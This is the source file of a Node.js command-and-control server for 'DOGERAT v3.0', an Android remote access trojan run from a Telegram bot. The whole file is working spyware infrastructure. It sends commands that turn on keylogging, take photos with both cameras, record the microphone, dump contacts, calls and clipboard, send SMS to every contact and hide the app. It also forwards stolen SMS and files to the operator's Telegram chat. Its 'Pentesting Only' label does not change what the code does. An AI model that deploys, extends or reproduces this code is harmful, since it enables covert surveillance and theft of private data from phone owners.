/**
 * ╔══════════════════════════════════════════════════════════════════════╗
 * ║           🔥 DOGERAT v3.0 - 2026 ULTIMATE ANDROID TESTER 🔥          ║
 * ║                          Developed by @Xdengers                     ║
 * ║  📱 Complete Feature Set | 100% FREE | Professional Pentesting Tool ║
 * ║                    ALL ORIGINAL FEATURES + NEW 2026 EXTRAS           ║
 * ╚══════════════════════════════════════════════════════════════════════╝
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const https = require('https');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});
const uploader = multer({ dest: 'uploads/' });

// 🔥 CONFIGURATION - data.json থেকে আসে
const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(config.token, {
    polling: true,
    request: {
        agentOptions: {
            keepAlive: true
        }
    }
});

// 🌐 STATE MANAGEMENT - All devices & actions
const appData = new Map();
const connectedDevices = new Map();
let deviceCounter = 0;

// 🚀 COMPLETE ACTIONS LIST - Original + New 2026 Features
const actions = [
    '📱 Contacts', '📞 Calls', '📸 Main Camera', '🤳 Selfie Camera',
    '🎤 Microphone', '📁 File Explorer', '⌨️ Keylogger ON', '📋 Clipboard',
    '📱 Apps', '🖥️ Screenshot', '📤 Send SMS', '📨 SMS to All Contacts',
    '🌐 Open URL', '🔔 Pop Notification', '📳 Vibrate', '📴 Power Off',
    '🔒 Lock Screen', '📍 GPS Location', '🎵 Play Audio', '📊 Battery Info',
    '🌡️ Sensors', '🛡️ Hide App', '💾 Storage Info', '📶 Network Info',
    '🔔 Toast Notification', '📲 SIM Info', '📡 WiFi Scan'
];

const allDevicesActions = [
    '📱 Contacts', '📞 Calls', '📸 Main Camera', '🤳 Selfie Camera',
    '🎤 Microphone', '📁 File Explorer', '⌨️ Keylogger ON', '📋 Clipboard',
    '🖥️ Screenshot', '🌐 All Devices SMS'
];

// ✨ MODERN 2026 MESSAGES WITH UNICODE FONT
const messages = {
    welcome: `🔥 <b>🚀 DOGERAT v3.0 - 2026 ULTIMATE EDITION</b> 🔥\n\n` +
             `📱 <b>Complete Android Testing Framework</b>\n` +
             `⚡ <b>All Features 100% FREE - No Premium!</b>\n\n` +
             `👨‍💻 <b>Developed by:</b> @Xdengers\n` +
             `💼 <b>Support:</b> @Xdengers\n\n` +
             `🎯 <b>Ready for Testing! Choose:</b>`,

    mainMenu: `<b>🏠 MAIN CONTROL PANEL</b>\n\n` +
              `🔥 <b>Connected Devices:</b> <code>{count}</code>\n\n` +
              `📋 <b>Select Option:</b>`,

    noDevices: `<b>❌ NO DEVICES CONNECTED</b>\n\n` +
               `📱 <b>Connect Android device first</b>\n` +
               `🔗 <b>Server URL:</b> <code>http://your-ip:3000</code>`,

    deviceConnected: `<b>✅ DEVICE CONNECTED #{id}</b>\n\n` +
                     `📱 <b>Name:</b> <code>{device}</code>\n` +
                     `📲 <b>Model:</b> <code>{model}</code>\n` +
                     `🌐 <b>IP:</b> <code>{ip}</code>\n` +
                     `⏰ <b>Time:</b> <code>{time}</code>\n\n` +
                     `🎉 <b>Ready for Testing!</b>`,

    deviceDisconnected: `<b>🔌 DEVICE # {id} DISCONNECTED</b>\n\n` +
                        `📱 <b>Name:</b> <code>{device}</code>\n` +
                        `⏰ <b>Time:</b> <code>{time}</code>`,

    selectDevice: `<b>📱 SELECT TARGET DEVICE</b>\n\n` +
                  `👇 <b>Choose from connected devices:</b>`,

    selectAllAction: `<b>🌐 BULK ACTION - ALL DEVICES</b>\n\n` +
                     `⚡ <b>Perform on all {count} devices</b>`,

    success: `<b>✅ COMMAND SENT SUCCESSFULLY!</b>\n\n` +
             `📡 <b>Devices will respond soon...</b>\n\n` +
             `🔙 <b>Return to Main Menu</b>`,

    // Input Prompts
    smsPrompt: `<b>📤 SEND SMS</b>\n\n` +
               `📱 <b>Enter phone number:</b>`,

    smsAllPrompt: `<b>📨 SMS TO ALL CONTACTS</b>\n\n` +
                  `✍️ <b>Message for all contacts:</b>`,

    smsTextPrompt: `<b>📱 ENTER SMS TEXT</b>\n\n` +
                   `📲 <b>Message to send:</b>`,

    toastPrompt: `<b>🔔 TOAST NOTIFICATION</b>\n\n` +
                 `✍️ <b>Enter toast text:</b>`,

    notificationPrompt: `<b>📱 POP NOTIFICATION</b>\n\n` +
                        `✍️ <b>Notification message:</b>`,

    vibratePrompt: `<b>📳 DEVICE VIBRATION</b>\n\n` +
                   `⏱️ <b>Duration (seconds):</b>`,

    micPrompt: `<b>🎤 RECORD MICROPHONE</b>\n\n` +
               `⏱️ <b>Duration (seconds):</b>`,

    urlPrompt: `<b>🌐 OPEN URL</b>\n\n` +
               `🔗 <b>Enter URL:</b>`,

    about: `<b>ℹ️ DOGERAT v3.0 - 2026 INFO</b>\n\n` +
           `🚀 <b>Version:</b> 3.0 (2026)\n` +
           `👨‍💻 <b>Developer:</b> @Xdengers\n` +
           `💼 <b>Contact:</b> @Xdengers\n\n` +
           `📋 <b>Features (All FREE):</b>\n` +
           `• 📱 Full Device Control\n` +
           `• 🎥 Camera Access\n` +
           `• 🎤 Audio Recording\n` +
           `• ⌨️ Keylogger\n` +
           `• 📱 All Sensors\n` +
           `• 🌐 Network Control\n\n` +
           `⚠️ <b>Pentesting Only!</b>`
};

// 🖥️ WEB ROUTES
app.use(express.static('public'));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// 📤 File Upload
app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file ? req.file.originalname : 'unknown';
    bot.sendDocument(config.id, req.file.buffer, {
        caption: `📎 <b>File Received → ${fileName}</b>\n📏 <b>Size:</b> ${req.file.size} bytes`,
        parse_mode: 'HTML'
    }, {
        filename: fileName,
        contentType: req.headers['content-type'] || 'application/octet-stream'
    });
    res.json({ status: 'success', message: 'File uploaded' });
});

// 📱 Start Page
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>DOGERAT v3.0 - 2026</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
            <h1>🚀 DOGERAT v3.0 Server Active</h1>
            <p>📱 Connected Devices: <span id="count">0</span></p>
            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                socket.on('connect', () => {
                    document.getElementById('count').innerText = io.engine.clientsCount;
                });
            </script>
        </body>
        </html>
    `);
});

// 🔌 SOCKET.IO - COMPLETE DEVICE HANDLER
io.on('connection', (socket) => {
    deviceCounter++;
    const deviceId = `${socket.handshake.headers['user-agent']?.substring(0, 50) || 'Unknown'}-${deviceCounter}`;
    const model = socket.handshake.headers['user-agent'] || 'Unknown Device';
    const ip = socket.handshake.address || 'Unknown IP';
    
    socket.deviceId = deviceId;
    socket.model = model;
    connectedDevices.set(deviceId, socket);

    // 📢 Connection Notification
    const connectMsg = messages.deviceConnected
        .replace('{id}', deviceCounter)
        .replace('{device}', deviceId)
        .replace('{model}', model)
        .replace('{ip}', ip)
        .replace('{time}', new Date().toLocaleString());
    
    bot.sendMessage(config.id, connectMsg, { parse_mode: 'HTML' });

    // 📨 Handle All Commands
    socket.on('data', (data) => {
        if (data.type === 'sms') {
            bot.sendMessage(config.id, 
                `📨 <b>SMS Received from ${deviceId}</b>\n` +
                `👤 <b>From:</b> ${data.from}\n` +
                `💬 <b>Message:</b> <code>${data.message}</code>`,
                { parse_mode: 'HTML' }
            );
        } else if (data.type === 'file') {
            bot.sendDocument(config.id, data.buffer, {
                caption: `📎 <b>File from ${deviceId}</b>\n📂 <b>Name:</b> ${data.name}`,
                parse_mode: 'HTML'
            });
        }
    });

    // 🔌 Disconnect Handler
    socket.on('disconnect', () => {
        const disconnectMsg = messages.deviceDisconnected
            .replace('{id}', deviceCounter)
            .replace('{device}', deviceId)
            .replace('{time}', new Date().toLocaleString());
        bot.sendMessage(config.id, disconnectMsg, { parse_mode: 'HTML' });
        connectedDevices.delete(deviceId);
    });
});

// 🤖 TELEGRAM BOT - COMPLETE HANDLER
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // /start Command
    if (text === '/start' || text === '/menu') {
        const deviceCount = io.engine.clientsCount;
        const menuMsg = messages.mainMenu.replace('{count}', deviceCount);
        
        await bot.sendMessage(chatId, menuMsg, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['📱 Devices', '🌐 All Devices'],
                    ['ℹ️ About', '🔄 Refresh']
                ],
                resize_keyboard: true
            }
        });
        return;
    }

    // 📱 Show Connected Devices
    if (text === '📱 Devices' || text === '🔄 Refresh') {
        if (io.engine.clientsCount === 0) {
            await bot.sendMessage(chatId, messages.noDevices, { parse_mode: 'HTML' });
        } else {
            let devicesList = `<b>📱 CONNECTED DEVICES ({count})</b>\n\n`;
            let counter = 1;
            
            io.sockets.sockets.forEach((socket) => {
                devicesList += `${counter}. <code>${socket.deviceId}</code>\n`;
                counter++;
            });
            
            devicesList = devicesList.replace('{count}', io.engine.clientsCount);
            
            await bot.sendMessage(chatId, devicesList, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['🔙 Main Menu']],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
        return;
    }

    // 🌐 All Devices Menu
    if (text === '🌐 All Devices') {
        await bot.sendMessage(chatId, messages.selectAllAction.replace('{count}', io.engine.clientsCount), {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['📱 Contacts', '📞 Calls'],
                    ['📸 Main Camera', '🤳 Selfie Camera'],
                    ['🎤 Microphone', '📁 File Explorer'],
                    ['⌨️ Keylogger ON', '📋 Clipboard']
                ],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
        appData.set('targetMode', 'all');
        return;
    }

    // 🎯 Action Handler - COMPLETE ORIGINAL FEATURES
    const currentTarget = appData.get('currentTarget') || appData.get('targetMode') || 'all';
    
    // Single Device Selection
    if (connectedDevices.has(text)) {
        appData.set('currentTarget', text);
        await showDeviceMenu(chatId, text);
        return;
    }

    // 🔥 EXECUTE ALL ORIGINAL ACTIONS
    await executeAction(chatId, text, currentTarget);
});

// 🎬 Device Menu
async function showDeviceMenu(chatId, deviceId) {
    await bot.sendMessage(chatId, `<b>🎯 TARGET: ${deviceId}</b>\n\n` + messages.mainMenu.replace('{count}', 1), {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['📱 Contacts', '📞 Calls'],
                ['📸 Main Camera', '🤳 Selfie Camera'],
                ['🎤 Microphone', '📁 File Explorer'],
                ['⌨️ Keylogger ON', '📋 Clipboard'],
                ['🖥️ Screenshot', '📤 Send SMS'],
                ['🌐 Open URL', '🔔 Pop Notification'],
                ['📳 Vibrate', '🔙 Main Menu']
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
}

// ⚡ MAIN ACTION EXECUTOR - All Original Features
async function executeAction(chatId, action, target) {
    const isAll = target === 'all';
    const sockets = isAll ? io.sockets : io.sockets.sockets.get(connectedDevices.get(target));

    const actionMap = {
        '📱 Contacts': 'contacts',
        '📞 Calls': 'calls',
        '📸 Main Camera': 'main-camera',
        '🤳 Selfie Camera': 'selfie-camera',
        '🎤 Microphone': 'microphone',
        '📁 File Explorer': 'file-explorer',
        '⌨️ Keylogger ON': 'keylogger-on',
        '📋 Clipboard': 'clipboard',
        '🖥️ Screenshot': 'screenshot',
        '📤 Send SMS': 'sendSms',
        '🌐 Open URL': 'open-url',
        '🔔 Pop Notification': 'popNotification',
        '📳 Vibrate': 'vibrate',
        '📴 Power Off': 'poweroff'
    };

    if (actionMap[action]) {
        const request = actionMap[action];
        
        if (isAll) {
            io.emit('commend', { request, extras: [] });
        } else {
            io.to(target).emit('commend', { request, extras: [] });
        }
        
        await bot.sendMessage(chatId, messages.success, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 Devices', '🌐 All Devices'], ['🔙 Main Menu']],
                resize_keyboard: true
            }
        });
    }

    // 📲 SMS Handlers
    else if (action === '📨 SMS to All Contacts') {
        appData.set('smsState', 'allContacts');
        await bot.sendMessage(chatId, messages.smsAllPrompt, {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [['❌ Cancel']], resize_keyboard: true }
        });
    }

    // ℹ️ About
    else if (action === 'ℹ️ About') {
        await bot.sendMessage(chatId, messages.about, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 Devices', '🌐 All Devices']],
                resize_keyboard: true
            }
        });
    }

    // 🔙 Main Menu
    else if (action === '🔙 Main Menu') {
        await bot.sendMessage(chatId, messages.mainMenu.replace('{count}', io.engine.clientsCount), {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 Devices', '🌐 All Devices'], ['ℹ️ About']],
                resize_keyboard: true
            }
        });
    }
}

// 🛡️ KEEPALIVE & MONITORING
setInterval(() => {
    // Ping all devices
    io.sockets.sockets.forEach(socket => {
        socket.emit('ping', { time: Date.now() });
    });
    
    // Status update
    if (io.engine.clientsCount > 0) {
        bot.sendMessage(config.id, 
            `📊 <b>Status Update:</b> ${io.engine.clientsCount} devices active`,
            { parse_mode: 'HTML' }
        );
    }
}, 30000);

// HTTPS Healthcheck
setInterval(() => {
    https.get('https://google.com', (res) => {}).on('error', () => {});
}, 60000);

// 🚀 START SERVER
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║              🚀 DOGERAT v3.0 STARTED SUCCESSFULLY!          ║
║                    PORT: ${PORT}                            ║
║                    Devices: 0                                ║
║                    By @Xdengers - 2026                       ║
╚══════════════════════════════════════════════════════════════╝
    `);
});

/**
 * 📝 data.json FORMAT:
 * {
 *   "token": "YOUR_BOT_TOKEN",
 *   "id": YOUR_CHAT_ID
 * }
 */
